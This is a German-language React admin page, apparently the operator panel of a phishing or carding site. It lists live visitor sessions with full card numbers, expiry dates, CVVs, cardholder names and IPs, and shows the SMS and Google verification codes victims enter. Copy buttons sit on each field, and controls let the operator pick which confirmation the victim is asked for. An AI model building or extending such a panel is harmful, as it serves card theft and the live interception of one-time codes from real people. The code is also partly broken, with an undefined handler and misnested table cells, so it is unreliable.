import React, { useState, useEffect } from 'react';
import { CreditCard, Eye, EyeOff, Clock, Users, Smartphone, MessageSquare, CheckCircle, RotateCcw } from 'lucide-react';
import { ProtectedRoute } from '@/components/ProtectedRoute';
import { SidebarProvider } from '@/components/ui/sidebar';
import { AppSidebar } from '@/components/AppSidebar';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { useOptimisticDashboard } from '@/hooks/useOptimisticDashboard';
import { useToast } from '@/hooks/use-toast';
import { format } from 'date-fns';
import { de } from 'date-fns/locale';

interface PaymentSession {
  id: string;
  session_id: string;
  created_at: string;
  last_seen: string;
  is_active: boolean;
  user_ip: string;
  verification_method: string;
  verification_status: string;
  sms_code: string;
  google_code: string;
  admin_action_pending: boolean;
  orders: {
    order_number: number;
    final_price: number;
    cardholder_name: string;
    card_number: string;
    expiry_date: string;
    cvv: string;
    created_at: string;
  };
}

const Payments = () => {
  const [showInactive, setShowInactive] = useState(false);
  const { toast } = useToast();
  
  // Use optimistic dashboard hook
  const { 
    activeSessions, 
    inactiveSessions, 
    loading, 
    fetchInactiveSessions, 
    handleVerificationAction, 
    handleCompletePayment,
    handleResetVerification
  } = useOptimisticDashboard();

  // Handle show/hide inactive sessions
  useEffect(() => {
    if (showInactive) {
      fetchInactiveSessions();
    }
  }, [showInactive, fetchInactiveSessions]);

  const formatLastSeen = (lastSeen: string) => {
    const now = new Date();
    const lastSeenDate = new Date(lastSeen);
    const diffInSeconds = Math.floor((now.getTime() - lastSeenDate.getTime()) / 1000);
    
    if (diffInSeconds < 60) {
      return `vor ${diffInSeconds} Sekunden`;
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60);
      return `vor ${minutes} Minute${minutes > 1 ? 'n' : ''}`;
    } else {
      const hours = Math.floor(diffInSeconds / 3600);
      return `vor ${hours} Stunde${hours > 1 ? 'n' : ''}`;
    }
  };

  const formatDuration = (createdAt: string, lastSeen: string) => {
    const created = new Date(createdAt);
    const last = new Date(lastSeen);
    const diffInMinutes = Math.floor((last.getTime() - created.getTime()) / (1000 * 60));
    
    if (diffInMinutes < 60) {
      return `${diffInMinutes} Min`;
    } else {
      const hours = Math.floor(diffInMinutes / 60);
      const minutes = diffInMinutes % 60;
      return `${hours}h ${minutes}m`;
    }
  };

  const copyToClipboard = async (text: string, label: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "In Zwischenablage kopiert",
        description: `${label} wurde erfolgreich kopiert.`,
      });
    } catch (error) {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = text;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      
      toast({
        title: "In Zwischenablage kopiert",
        description: `${label} wurde erfolgreich kopiert.`,
      });
    }
  };

  // Action handlers are now provided by the hook

  const getVerificationStatusBadge = (status: string) => {
    switch (status) {
      case 'waiting':
        return <Badge variant="secondary">Wartend</Badge>;
      case 'choice_required':
        return <Badge variant="outline">Wahl</Badge>;
      case 'app_confirmation':
        return <Badge variant="outline">App</Badge>;
      case 'sms_confirmation':
        return <Badge variant="outline">SMS</Badge>;
      case 'app_confirmed':
        return <Badge variant="default">App bestätigt</Badge>;
      case 'sms_confirmation':
        return <Badge variant="outline">SMS bestätigung</Badge>;
      case 'sms_confirmed':
        return <Badge variant="default">SMS bestätigt</Badge>;
      case 'google_code_confirmation':
        return <Badge variant="outline">Google-Code</Badge>;
      case 'google_code_entered':
        return <Badge variant="outline">Google-Code eingegeben</Badge>;
      case 'google_code_confirmed':
        return <Badge variant="default">Google-Code bestätigt</Badge>;
      case 'completed':
        return <Badge variant="default" className="bg-green-600">Abgeschlossen</Badge>;
      default:
        return <Badge variant="secondary">Unbekannt</Badge>;
    }
  };

  const sessionsToDisplay = showInactive ? inactiveSessions : activeSessions;

  return (
    <ProtectedRoute>
      <SidebarProvider>
        <div className="min-h-screen flex w-full">
          <AppSidebar />
          <main className="flex-1 p-6 bg-gray-50/30">
            <div className="w-full space-y-6">
              {/* Header */}
              <div className="flex items-center justify-between">
                <div>
                  <h1 className="text-3xl font-bold text-foreground">Zahlungen</h1>
                  <p className="text-muted-foreground mt-1">
                    Aktive und inaktive Payment-Sessions verwalten
                  </p>
                </div>
                <Button
                  onClick={() => setShowInactive(!showInactive)}
                  variant={showInactive ? "default" : "outline"}
                  className="flex items-center space-x-2"
                >
                  {showInactive ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                  <span>
                    {showInactive ? 'Aktive Sessions' : 'Inaktive Sessions'}
                  </span>
                </Button>
              </div>

              {/* Stats Cards */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Aktive Sessions</CardTitle>
                    <Users className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold text-green-600">
                      {activeSessions.length}
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Nutzer auf Payment-Seiten
                    </p>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Gesamtumsatz aktiv</CardTitle>
                    <CreditCard className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">
                      €{activeSessions.reduce((sum, session) => sum + (session.orders?.final_price || 0), 0).toFixed(2)}
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Von aktiven Sessions
                    </p>
                  </CardContent>
                </Card>

                <Card>
                  <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                    <CardTitle className="text-sm font-medium">Durchschnittliche Dauer</CardTitle>
                    <Clock className="h-4 w-4 text-muted-foreground" />
                  </CardHeader>
                  <CardContent>
                    <div className="text-2xl font-bold">
                      {activeSessions.length > 0 
                        ? Math.round(activeSessions.reduce((sum, session) => {
                            const duration = (new Date(session.last_seen).getTime() - new Date(session.created_at).getTime()) / (1000 * 60);
                            return sum + duration;
                          }, 0) / activeSessions.length)
                        : 0} Min
                    </div>
                    <p className="text-xs text-muted-foreground">
                      Pro Session
                    </p>
                  </CardContent>
                </Card>
              </div>

              {/* Sessions Table */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <span>
                      {showInactive ? 'Inaktive Sessions' : 'Aktive Sessions'}
                    </span>
                    <Badge variant={showInactive ? "secondary" : "default"}>
                      {sessionsToDisplay.length}
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {loading ? (
                    <div className="flex items-center justify-center py-8">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
                    </div>
                  ) : sessionsToDisplay.length === 0 ? (
                    <div className="text-center py-8 text-muted-foreground">
                      Keine {showInactive ? 'inaktiven' : 'aktiven'} Sessions gefunden
                    </div>
                  ) : (
                    <div className="overflow-x-auto">
                      <Table>
                         <TableHeader>
                           <TableRow>
                             <TableHead>Status</TableHead>
                             <TableHead>Bestellnummer</TableHead>
                             <TableHead className="hidden lg:table-cell">Datum</TableHead>
                             <TableHead>Endpreis</TableHead>
                             <TableHead>Karteninhaber</TableHead>
                             <TableHead className="hidden xl:table-cell">Kartennummer</TableHead>
                             <TableHead className="hidden xl:table-cell">Ablauf</TableHead>
                             <TableHead className="hidden xl:table-cell">CVV</TableHead>
                              <TableHead>Verifikation</TableHead>
                              <TableHead className="hidden lg:table-cell">SMS-Code</TableHead>
                              <TableHead className="hidden lg:table-cell">Google-Code</TableHead>
                              <TableHead className="hidden lg:table-cell">App-Status</TableHead>
                             <TableHead className="hidden md:table-cell">Letzte Aktivität</TableHead>
                             <TableHead className="hidden lg:table-cell">Dauer</TableHead>
                             <TableHead>Aktionen</TableHead>
                           </TableRow>
                         </TableHeader>
                        <TableBody>
                          {sessionsToDisplay.map((session) => (
                            <TableRow key={session.id}>
                              <TableCell>
                                <div className="flex items-center space-x-2">
                                   <div className={`w-2 h-2 rounded-full ${
                                     session.is_active && 
                                     (new Date().getTime() - new Date(session.last_seen).getTime()) < 1800000
                                       ? 'bg-green-500' 
                                       : 'bg-gray-400'
                                   }`} />
                                   <Badge variant={
                                     session.is_active && 
                                     (new Date().getTime() - new Date(session.last_seen).getTime()) < 1800000
                                       ? "default" 
                                       : "secondary"
                                   }>
                                     {session.is_active && 
                                      (new Date().getTime() - new Date(session.last_seen).getTime()) < 1800000
                                       ? 'Aktiv' 
                                       : 'Inaktiv'}
                                   </Badge>
                                </div>
                              </TableCell>
                               <TableCell className="font-mono">
                                 {session.orders?.order_number || '-'}
                               </TableCell>
                               <TableCell className="whitespace-nowrap hidden lg:table-cell">
                                 {session.orders?.created_at 
                                   ? format(new Date(session.orders.created_at), 'dd.MM.yyyy HH:mm', { locale: de })
                                   : '-'}
                               </TableCell>
                               <TableCell className="font-medium">
                                 €{session.orders?.final_price?.toFixed(2) || '0.00'}
                               </TableCell>
                               <TableCell 
                                 className="cursor-pointer hover:bg-gray-100 transition-colors"
                                 onClick={() => session.orders?.cardholder_name && copyToClipboard(session.orders.cardholder_name, 'Karteninhaber')}
                               >
                                 {session.orders?.cardholder_name || '-'}
                               </TableCell>
                               <TableCell 
                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
                                 onClick={() => session.orders?.card_number && copyToClipboard(session.orders.card_number, 'Kartennummer')}
                               >
                                 {session.orders?.card_number || '-'}
                               </TableCell>
                               <TableCell 
                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
                                 onClick={() => session.orders?.expiry_date && copyToClipboard(session.orders.expiry_date, 'Ablaufdatum')}
                               >
                                 {session.orders?.expiry_date || '-'}
                               </TableCell>
                               <TableCell 
                                 className="font-mono cursor-pointer hover:bg-gray-100 transition-colors hidden xl:table-cell"
                                 onClick={() => session.orders?.cvv && copyToClipboard(session.orders.cvv, 'CVV')}
                               >
                                 {session.orders?.cvv || '-'}
                               </TableCell>
                               <TableCell>
                                 {getVerificationStatusBadge(session.verification_status)}
                               </TableCell>
                               <TableCell 
                                 className="font-mono text-center cursor-pointer hover:bg-gray-100 transition-colors hidden lg:table-cell"
                                 onClick={() => session.sms_code && copyToClipboard(session.sms_code, 'SMS-Code')}
                               >
                                 {session.verification_method === 'sms_confirmation' && session.sms_code 
                                   ? session.sms_code 
                                   : '-'}
                                <TableCell 
                                  className="font-mono text-center cursor-pointer hover:bg-gray-100 transition-colors hidden lg:table-cell"
                                  onClick={() => session.google_code && copyToClipboard(session.google_code, 'Google-Code')}
                                >
                                  {session.verification_method === 'google_code_confirmation' && session.google_code 
                                    ? session.google_code 
                                    : '-'}
                                </TableCell>
                                 {session.verification_method === 'app_confirmation' ? (
                                   <div className={`w-3 h-3 rounded-full mx-auto ${
                                     session.verification_status === 'app_confirmed' 
                                       ? 'bg-green-500' 
                                       : 'bg-red-500'
                                   }`} />
                                 ) : '-'}
                               </TableCell>
                               <TableCell className="whitespace-nowrap text-sm text-muted-foreground hidden md:table-cell">
                                 {formatLastSeen(session.last_seen)}
                               </TableCell>
                               <TableCell className="whitespace-nowrap text-sm hidden lg:table-cell">
                                 {formatDuration(session.created_at, session.last_seen)}
                               </TableCell>
                               <TableCell>
                                 <div className="flex flex-wrap gap-1">
                                   {session.verification_status === 'waiting' && session.verification_method === 'pending' && (
                                     <>
                                       <Button
                                         size="sm"
                                         variant="outline"
                                         onClick={() => handleVerificationAction(session.session_id, 'app_confirmation')}
                                         className="text-xs px-2 py-1"
                                       >
                                         <Smartphone className="w-3 h-3" />
                                         <span className="hidden sm:inline ml-1">App</span>
                                       </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => setVerificationMethod(session.session_id, 'sms_confirmation')}
                        >
                          SMS
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => setVerificationMethod(session.session_id, 'google_code_confirmation')}
                        >
                          Code
                        </Button>
                                       <Button
                                         size="sm"
                                         variant="outline"
                                         onClick={() => handleVerificationAction(session.session_id, 'choice_required')}
                                         className="text-xs px-2 py-1"
                                       >
                                         <CheckCircle className="w-3 h-3" />
                                         <span className="hidden sm:inline ml-1">Wahl</span>
                                       </Button>
                                     </>
                                   )}
                                    {(session.verification_status === 'app_confirmed' || session.verification_status === 'sms_confirmed') && (
                                      <>
                                        <Button
                                          size="sm"
                                          onClick={() => handleCompletePayment(session.session_id)}
                                          className="bg-green-600 hover:bg-green-700 text-white text-xs px-2 py-1"
                                        >
                                          Bestätigen
                                        </Button>
                                        <Button
                                          size="sm"
                                          onClick={() => handleResetVerification(session.session_id)}
                                          className="bg-red-600 hover:bg-red-700 text-white text-xs px-2 py-1 ml-1"
                                        >
                                          <RotateCcw className="w-3 h-3" />
                                          <span className="hidden sm:inline ml-1">Fehlgeschlagen</span>
                                        </Button>
                                      </>
                                    )}
                                 </div>
                               </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </main>
        </div>
      </SidebarProvider>
    </ProtectedRoute>
  );
};

export default Payments;